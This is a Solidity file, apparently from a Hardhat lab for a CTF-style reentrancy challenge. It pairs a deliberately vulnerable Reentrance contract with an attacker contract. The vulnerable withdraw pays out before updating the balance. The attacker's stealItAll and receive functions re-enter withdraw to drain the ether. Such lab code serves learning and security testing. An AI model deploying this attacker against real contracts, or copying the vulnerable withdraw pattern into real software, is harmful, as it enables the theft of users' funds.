// SPDX-License-Identifier: MIT
pragma solidity ^0.6.12;

import "../general/SafeMath_0.6.0.sol";
import "hardhat/console.sol";

contract ReentranceAttacker {
    Reentrance reentranceContract;

    constructor(address payable _contract) public {
        reentranceContract = Reentrance(_contract);
    }

    function stealItAll(uint _amount) external {
        console.log("stealItAll called");
        reentranceContract.withdraw(_amount);
    }

    receive() external payable {
        reentranceContract.withdraw(msg.value);
    }
}

contract Reentrance {
    using SafeMath for uint256;
    mapping(address => uint) public balances;

    function donate(address _to) public payable {
        balances[_to] = balances[_to].add(msg.value);
    }

    function balanceOf(address _who) public view returns (uint balance) {
        return balances[_who];
    }

    function withdraw(uint _amount) public {
        console.log(balances[msg.sender]);
        console.log(_amount);
        if (balances[msg.sender] >= _amount) {
            console.log("Just stole:", _amount);
            (bool result, ) = msg.sender.call{value: _amount}("");
            if (result) {
                _amount;
            }
            balances[msg.sender] -= _amount;
        }
    }

    receive() external payable {}
}
